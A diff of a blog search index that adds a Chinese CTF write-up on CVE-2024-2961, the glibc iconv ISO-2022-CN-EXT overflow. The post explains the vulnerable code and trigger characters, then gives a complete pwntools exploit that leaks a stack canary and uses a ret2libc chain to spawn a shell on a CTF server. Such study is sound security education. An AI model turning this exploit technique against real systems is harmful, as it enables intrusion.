@@ -1,6 +1,136 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CVE-2024-2961</title>
+    <url>/blog/2024/09/21/CVE-2024-2961/</url>
+    <content><![CDATA[<h2 id="iconv-cve-2024-2961"><a href="#iconv-cve-2024-2961" class="headerlink" title="iconv-cve-2024-2961"></a>iconv-cve-2024-2961</h2><h4 id="一、利用目的"><a href="#一、利用目的" class="headerlink" title="一、利用目的"></a>一、利用目的</h4><p>在二进制程序调用iconv这个glibc函数时，或是在PHP从一个字符集转换到另一个字符集调用iconv这个API时，其中当编码转换为ISO-2022-CN-EXT时，iconv有可能会产生缓冲区溢出</p>
+<h4 id="二、利用方式"><a href="#二、利用方式" class="headerlink" title="二、利用方式"></a>二、利用方式</h4><p>以从UTF-8转义到ISO-2022-CN-EXT为例。要触发此漏洞，我们需要迫使iconv()在输出缓冲区结束前发出一个转义序列。为此，我们可以使用诸如“劄”、“䂚”、“峛“等特殊字符。这将导致1到3字节的溢出，其溢出内容如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符 |		溢出内容		|		原UTF-8表示</span><br><span class="line">劄  		$*H [24 2A 48]      	  \xe5\x8a\x84</span><br><span class="line">䂚  		$+J [24 2B 4A]			  \xe4\x82\x9a</span><br><span class="line">峛  		$*H [24 2A 48]			  \xe5\xb3\x9b</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h4><p>先贴一张2.27libc中的漏洞点关键代码，具体可在pathToYourLibc&#x2F;iconvdata&#x2F;iso-2022-cn-ext.c中查看</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ESC	0x1b</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span>&#123;</span></span><br><span class="line">    ASCII_set = <span class="number">0</span>,</span><br><span class="line">  	GB2312_set,		<span class="comment">//1</span></span><br><span class="line">  	GB12345_set,	<span class="comment">//2</span></span><br><span class="line">  	CNS11643_1_set,	<span class="comment">//3</span></span><br><span class="line">  	ISO_IR_165_set,	<span class="comment">//4</span></span><br><span class="line">  	SO_mask = <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line">  	GB7589_set = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	GB13131_set = <span class="number">2</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	CNS11643_2_set = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	SS2_mask = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line">  	GB7590_set = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	GB13132_set = <span class="number">2</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_3_set = <span class="number">3</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_4_set = <span class="number">4</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_5_set = <span class="number">5</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_6_set = <span class="number">6</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_7_set = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	SS3_mask = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">&#125;</span><br><span class="line">...........................................................</span><br><span class="line"><span class="comment">/* See whether we have to emit an escape sequence.  */</span>		      </span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">set</span> != used)						      </span><br><span class="line">	  &#123;								      </span><br><span class="line">	    <span class="comment">/* First see whether we announced that we use this		      </span></span><br><span class="line"><span class="comment">	       character set.  */</span>					      </span><br><span class="line">	    <span class="keyword">if</span> ((used &amp; SO_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; <span class="number">8</span>))	      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">4</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">									      </span><br><span class="line">		assert (used &gt;= <span class="number">1</span> &amp;&amp; used &lt;= <span class="number">4</span>);			      </span><br><span class="line">		escseq = <span class="string">&quot;)A\0\0)G)E&quot;</span> + (used - <span class="number">1</span>) * <span class="number">2</span>;			      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SO_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> ((used &amp; SS2_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; <span class="number">8</span>))</span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		assert (used == CNS11643_2_set); <span class="comment">/* XXX */</span>		      </span><br><span class="line">		escseq = <span class="string">&quot;*H&quot;</span>;						      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SS2_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> ((used &amp; SS3_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; <span class="number">8</span>))</span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		assert ((used &gt;&gt; <span class="number">5</span>) &gt;= <span class="number">3</span> &amp;&amp; (used &gt;&gt; <span class="number">5</span>) &lt;= <span class="number">7</span>);		      </span><br><span class="line">		escseq = <span class="string">&quot;+I+J+K+L+M&quot;</span> + ((used &gt;&gt; <span class="number">5</span>) - <span class="number">3</span>) * <span class="number">2</span>;		      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SS3_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">									      </span><br><span class="line">	    <span class="keyword">if</span> (used == CNS11643_2_set)					      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">		*outptr++ = SS2_0;					      </span><br><span class="line">		*outptr++ = SS2_1;					      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> (used &gt;= CNS11643_3_set &amp;&amp; used &lt;= CNS11643_7_set)	      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">		*outptr++ = SS3_0;					      </span><br><span class="line">		*outptr++ = SS3_1;					      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span>							      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="comment">/* We only have to emit something if currently ASCII is	      </span></span><br><span class="line"><span class="comment">		   selected.  Otherwise we are switching within the	      </span></span><br><span class="line"><span class="comment">		   SO charset.  */</span>					      </span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">set</span> == ASCII_set)					      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    <span class="keyword">if</span> (outptr + <span class="number">1</span> &gt; outend)				      </span><br><span class="line">		      &#123;							      </span><br><span class="line">			result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">			<span class="keyword">break</span>;						      </span><br><span class="line">		      &#125;							      </span><br><span class="line">		    *outptr++ = SO;					      </span><br><span class="line">		  &#125;							      </span><br><span class="line">	      &#125;								      </span><br><span class="line">									      </span><br><span class="line">	    <span class="comment">/* Always test the length here since we have used up all the      </span></span><br><span class="line"><span class="comment">	       guaranteed output buffer slots.  */</span>			      </span><br><span class="line">	    <span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)					      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		result = __GCONV_FULL_OUTPUT;				      </span><br><span class="line">		<span class="keyword">break</span>;							      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	  &#125;								      </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)					      </span><br><span class="line">	  &#123;								      </span><br><span class="line">	    result = __GCONV_FULL_OUTPUT;				      </span><br><span class="line">	    <span class="keyword">break</span>;							      </span><br><span class="line">	  &#125;								      </span><br><span class="line">									      </span><br><span class="line">	*outptr++ = buf[<span class="number">0</span>];						      </span><br><span class="line">	*outptr++ = buf[<span class="number">1</span>];						      </span><br><span class="line">	<span class="built_in">set</span> = used;							      </span><br><span class="line">      &#125;									      </span><br><span class="line">									      </span><br><span class="line">    <span class="comment">/* Now that we wrote the output increment the input pointer.  */</span>	      </span><br><span class="line">    inptr += <span class="number">4</span>;								      </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>其中比较重要的是知道各种mask是掩码，与目标进行按位与操作时可以提取出掩码对应位的值，也就是提取出特征信息</p>
+<p><strong>used</strong>是当前正在处理的字符所属字符集的标识</p>
+<p><strong>set</strong>是当前的字符集标识</p>
+<p><strong>ann</strong>(annouce)是一个变量，用于记录已声明的字符集。</p>
+<p><strong>outptr</strong> 是指向当前输出缓冲区位置的指针。</p>
+<p><strong>outend</strong> 是指向输出缓冲区末尾（或可用空间的结束）的指针。</p>
+<p><strong>inptr</strong> 是指向当前输入缓冲区位置的指针</p>
+<h5 id="三种不同的字符集"><a href="#三种不同的字符集" class="headerlink" title="三种不同的字符集"></a>三种不同的字符集</h5><p>在字符编码转换中，SO（Shift Out）、SS2（Single Shift 2）和SS3（Single Shift 3）是用于指示不同字符集的特殊控制字符或转义序列。它们在处理多字节字符集（如ISO-2022）时尤其重要。以下是它们的区别和作用：</p>
+<h6 id="SO-Shift-Out"><a href="#SO-Shift-Out" class="headerlink" title="SO (Shift Out)"></a>SO (Shift Out)</h6><ul>
+<li><strong>用途</strong>: SO（Shift Out）是一个控制字符，用于从单字节字符集切换到多字节字符集。</li>
+<li><strong>控制字符</strong>: 通常表示为0x0E。</li>
+<li><strong>作用</strong>: 在ISO-2022编码中，SO字符表示后续的字节将使用特定的多字节字符集，直到遇到SI（Shift In）字符为止。SO和SI字符用于在ASCII和其他字符集之间切换。</li>
+</ul>
+<h6 id="SS2-Single-Shift-2"><a href="#SS2-Single-Shift-2" class="headerlink" title="SS2 (Single Shift 2)"></a>SS2 (Single Shift 2)</h6><ul>
+<li><strong>用途</strong>: SS2（Single Shift 2）是一个转义序列，用于临时从主字符集切换到第二辅助字符集，仅影响紧随其后的一个字符。</li>
+<li><strong>控制字符</strong>: 通常表示为0x8E。</li>
+<li><strong>作用</strong>: 在处理多字节字符时，SS2指示紧随其后的一个字节应被解释为第二辅助字符集中的字符。使用SS2字符可以在不改变当前字符集的情况下使用不同的字符集中的字符。</li>
+</ul>
+<h6 id="SS3-Single-Shift-3"><a href="#SS3-Single-Shift-3" class="headerlink" title="SS3 (Single Shift 3)"></a>SS3 (Single Shift 3)</h6><ul>
+<li><strong>用途</strong>: SS3（Single Shift 3）是一个转义序列，用于临时从主字符集切换到第三辅助字符集，仅影响紧随其后的一个字符。</li>
+<li><strong>控制字符</strong>: 通常表示为0x8F。</li>
+<li><strong>作用</strong>: 类似于SS2，SS3指示紧随其后的一个字节应被解释为第三辅助字符集中的字符。它允许在不改变当前字符集的情况下使用第三辅助字符集中的字符。</li>
+</ul>
+<p>具体不同字符集所属的类别可见源码中的枚举，mask掩码上方的字符集都是该类型的字符集</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span>&#123;</span></span><br><span class="line">    	ASCII_set = <span class="number">0</span>,</span><br><span class="line">  	GB2312_set,		<span class="comment">//1</span></span><br><span class="line">  	GB12345_set,	<span class="comment">//2</span></span><br><span class="line">  	CNS11643_1_set,	<span class="comment">//3</span></span><br><span class="line">  	ISO_IR_165_set,	<span class="comment">//4</span></span><br><span class="line">  	SO_mask = <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line">  	GB7589_set = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	GB13131_set = <span class="number">2</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	CNS11643_2_set = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	SS2_mask = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line">  	GB7590_set = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	GB13132_set = <span class="number">2</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_3_set = <span class="number">3</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_4_set = <span class="number">4</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_5_set = <span class="number">5</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_6_set = <span class="number">6</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_7_set = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	SS3_mask = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="实际运行中的-used-及其对应分支"><a href="#实际运行中的-used-及其对应分支" class="headerlink" title="实际运行中的 used 及其对应分支"></a>实际运行中的 used 及其对应分支</h5><p>以UTF-8转义到ISO-2022-CN-EXT为例</p>
+<p>具体哪一个 <code>used</code> 的值被设置，取决于UTF-8输入字符在ISO-2022-CN-EXT字符集中的对应字符集。例如：</p>
+<ul>
+<li>如果输入字符是GB2312字符集中的字符，<code>used</code> 将被设置为 <code>GB2312_set</code>（值为1）。</li>
+<li>如果输入字符是CNS11643-2字符集中的字符，<code>used</code> 将被设置为 <code>CNS11643_2_set</code>（值为24）。</li>
+<li>如果输入字符是CNS11643-3字符集中的字符，<code>used</code> 将被设置为 <code>CNS11643_3_set</code>（值为96）。</li>
+</ul>
+<p>假设当前输入字符在GB2312字符集中，<code>used</code> 将被设置为 <code>GB2312_set</code>（1），并进入第一个 <code>if</code> 分支，发出对应的转义序列。类似地，对于其他字符集，<code>used</code> 将被设置为相应的值，并进入对应的 <code>if</code> 分支。</p>
+<h5 id="具体执行过程"><a href="#具体执行过程" class="headerlink" title="具体执行过程"></a>具体执行过程</h5><p><strong>1. 检查是否需要发出转义序列</strong>：首先检查当前使用的字符集（<code>set</code>）是否与目标字符集（<code>used</code>）不同。如果不同，则需要发出转义序列。</p>
+<p><strong>2. 判断是否已经声明使用该字符集</strong>：</p>
+<p>我们现在详细分析下3个if分支的条件</p>
+<p><code>if ((used &amp; SO_mask) != 0 &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; 8))</code>	</p>
+<ul>
+<li><p>used &amp; SO_mask 在目标字符集类型为SO时不为0</p>
+</li>
+<li><p>(ann &amp; SO_ann) !&#x3D; (used &lt;&lt; 8)用于检测是否声明过该字符集</p>
+</li>
+<li><p>如果目标字符集是<code>SO</code>类型且未声明，则生成相应的转义序列。</p>
+</li>
+</ul>
+<p><code>else if ((used &amp; SS2_mask) != 0 &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; 8))</code></p>
+<ul>
+<li>如果目标字符集是<code>SS2</code>类型且未声明，则生成相应的转义序列。</li>
+</ul>
+<p><code>else if ((used &amp; SS3_mask) != 0 &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; 8))</code></p>
+<ul>
+<li>如果目标字符集是<code>SS3</code>类型且未声明，则生成相应的转义序列。</li>
+</ul>
+<p>实际我们发现只有在SO的分支里有一段边界检测的代码</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (outptr + <span class="number">4</span> &gt; outend)				      </span><br><span class="line">&#123;							      </span><br><span class="line">	result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">	<span class="keyword">break</span>;						     </span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>那么我们要利用漏洞，首先就要输入一个SS2字符集或SS3字符集的字符。</p>
+<p><strong>3.生成转义序列</strong>：</p>
+<ul>
+<li>根据<code>used</code>字符集的类型，选择相应的转义序列，并写入输出缓冲区<code>outptr</code>。&lt;—关键漏洞点</li>
+<li>更新已声明的字符集<code>ann</code>。</li>
+</ul>
+<p><code>escseq</code> 是一个指向字符数组的指针，用于存储转义序列（escape sequence）。这些转义序列用于在输出数据中标识字符集的切换或特定字符的编码方式。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *escseq;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SO 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;)A\0\0)G)E&quot;</span> + (used - <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SS2 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;*H&quot;</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SS3 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;+I+J+K+L+M&quot;</span> + ((used &gt;&gt; <span class="number">5</span>) - <span class="number">3</span>) * <span class="number">2</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><strong>4.为特定字符集生成额外的字节</strong>：</p>
+<ul>
+<li>如果<code>used</code>是<code>CNS11643_2_set</code>，且<strong>outptr + 2 &lt;&#x3D; outend</strong>则会加上ESC(即0x1b)与0x4e的后缀。</li>
+<li>如果<code>used</code>在<code>CNS11643_3_set</code>到<code>CNS11643_7_set</code>之间，且<strong>outptr + 2 &lt;&#x3D; outend</strong>则会加上ESC与0x4f的后缀。</li>
+</ul>
+<p><strong>5.切换到ASCII字符集时发出SO字节</strong>：如果当前字符集是ASCII需要切换，且<strong>outptr + 1 &lt;&#x3D; outend</strong>，则加入0x0e后缀。</p>
+<p><strong>6.检查输出缓冲区长度</strong>：确保在写入新的字节前输出缓冲区<code>outptr</code>有足够的空间，否则返回<code>__GCONV_FULL_OUTPUT</code>错误。</p>
+<p><strong>7.改变当前字符集（若与目标字符集不同）</strong>：<code>set = used;</code></p>
+<p><strong>8.自增输入指针</strong>：处理完一个字符后，增加输入指针<code>inptr</code>。</p>
+<h4 id="四、实例分析"><a href="#四、实例分析" class="headerlink" title="四、实例分析"></a>四、实例分析</h4><h5 id="XGCTF-echo"><a href="#XGCTF-echo" class="headerlink" title="XGCTF [echo]"></a>XGCTF [echo]</h5><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185742098.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185755294.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185806653.png"
+                      class=""
+                >
+
+<p>64位程序开了canary保护，最后有个明显的往s里读0x60字节的栈溢出，那么我们就要想办法先得到canary的值。我们发现canary实际存在var_8处，而最后iconv函数实际对输入进行换编码后会存0x26字节到s中，s与canary之间只差0x28个字节，那么我们利用iconv的漏洞，先填充0x25个垃圾字符，最后写一个会触发漏洞的字符，就可以溢出3字节刚好把canary低位的\x00给覆盖了，那么printf(“%s”,s)就能直接把canary的值打印出来了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185814773.png"
+                      class=""
+                >
+
+<p>之后有了canary，又能栈溢出，直接ret2libc即可</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./echo&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28257</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./echo&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x25</span> + <span class="string">&quot;劄&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;\x48&quot;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">pop_rdi_ret = <span class="number">0x401493</span></span><br><span class="line">ret_add = <span class="number">0x40101a</span></span><br><span class="line">main_add = <span class="number">0x401256</span></span><br><span class="line">p.sendline(<span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;puts&quot;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(main_add)) </span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_add = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_add = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;collectcrop&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(bin_sh_add) + p64(ret_add) + p64(system_add)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Exploits under exception handling</title>
     <url>/blog/2024/09/21/Exploits-under-exception-handling/</url>
     <content><![CDATA[<h4 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h4><p>在栈溢出漏洞中，程序没有控制或错误控制输入的大小导致了该漏洞的产生。那我们很自然会想到能不能用<code>try</code>  <code>throw</code> <code>catch</code>的异常机制来捕获栈溢出行为，从而能更直观的获取错误信息，也在一定程度上避免了一些奇怪的错误产生。但在c++的异常处理实现中，如果我们放任输入数据超过缓冲区大小，冀以异常机制来捕获栈溢出，结果将不尽如人意，甚至还会导致canary保护机制的绕过。</p>
@@ -181,218 +311,6 @@
       <tags>
         <tag>pwn</tag>
         <tag>exception</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>gopwn初探</title>
-    <url>/blog/2024/09/22/go-pwn/</url>
-    <content><![CDATA[<h4 id="go-pwn的特点"><a href="#go-pwn的特点" class="headerlink" title="go pwn的特点"></a>go pwn的特点</h4><ul>
-<li><strong>Golang</strong> 使用了自己的运行时和内存管理机制。Go 的堆栈是可扩展的（split-stack model），即每个 Goroutine 的堆栈大小可以动态扩展。这使得堆栈布局更加复杂，和固定大小的堆栈相比更难预测。</li>
-<li>无标准栈帧，也就是不怎么依靠rbp作为栈帧指针（但实际那个位置有时还是维护rbp），通常通过rsp进行局部变量寻址。</li>
-<li>Go 语言依赖垃圾回收器管理内存，而 C&#x2F;C++ 依赖程序员手动管理内存。这意味着在 Go 程序中，利用内存分配漏洞（如 UAF 或 double free）时，必须考虑到垃圾回收器的行为。</li>
-<li>Go 语言的异常处理机制是通过 <code>panic</code> 和 <code>recover</code> 完成的，而不像 C&#x2F;C++ 使用 <code>setjmp/longjmp</code> 或 C++ 的异常捕获机制。这导致堆栈结构和控制流的变化更为复杂，特别是在发生 <code>panic</code> 后。在漏洞利用过程中，如果程序进入了 <code>panic</code> 状态，控制流会被重定向，这可能干扰漏洞利用过程。</li>
-<li>Go 的堆内存管理机制不同于标准的 <code>malloc</code>&#x2F;<code>free</code>。Go 运行时会使用自己的内存分配器，而不是像传统 C&#x2F;C++ 程序中依赖系统的 <code>malloc</code> 和 <code>free</code>。这意味着许多针对 C&#x2F;C++ 堆的利用技术，如 <code>fastbin attack</code>、<code>tcache</code> 等，不适用于 Go 程序。</li>
-</ul>
-<h4 id="栈扩展机制"><a href="#栈扩展机制" class="headerlink" title="栈扩展机制"></a>栈扩展机制</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:</span><br><span class="line">lea     r12, [rsp+var_218]			</span><br><span class="line">cmp     r12, [r14+10h]				//上面两句也有可能是cmp rsp, [r14+10h]这种形式</span><br><span class="line">jbe     loc_4C18C0</span><br><span class="line">......</span><br><span class="line">loc_4C18C0:</span><br><span class="line">mov     [rsp+arg_0], rax</span><br><span class="line">mov     [rsp+arg_8], rbx</span><br><span class="line">mov     [rsp+arg_10], rcx</span><br><span class="line">call    runtime_morestack_noctxt</span><br><span class="line">mov     rax, [rsp+arg_0]</span><br><span class="line">mov     rbx, [rsp+arg_8]</span><br><span class="line">mov     rcx, [rsp+arg_10]</span><br><span class="line">jmp     a</span><br></pre></td></tr></table></figure></div>
-
-<p>r14+0x10地址处存的就是当前栈段的上限信息，不够时会调用runtime_morestack_noctxt进行扩展。call一个函数时与c同样会把返回地址存到栈上，在栈扩展中也会维护好这个返回地址的位置。而每次栈扩展出的新栈与原来的栈是不连续的，但一个栈段只要大小没有耗尽，也可以存多个函数的栈帧。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202642330.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202650340.png"
-                      class=""
-                >
-
-<p>可以看到这里的栈实际不在x86_64常使用的栈段中。而且确实会把返回地址压入栈。</p>
-<h4 id="传参顺序"><a href="#传参顺序" class="headerlink" title="传参顺序"></a>传参顺序</h4><p>传参用到的寄存器依次是：AX，BX，CX，DI，SI，R8，R9，R10，R11</p>
-<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><h5 id="CISCN-2023-初赛-shallwego"><a href="#CISCN-2023-初赛-shallwego" class="headerlink" title="[CISCN 2023 初赛]shallwego"></a>[CISCN 2023 初赛]shallwego</h5><p>先运行一下看看：</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202702201.png"
-                      class=""
-                >
-
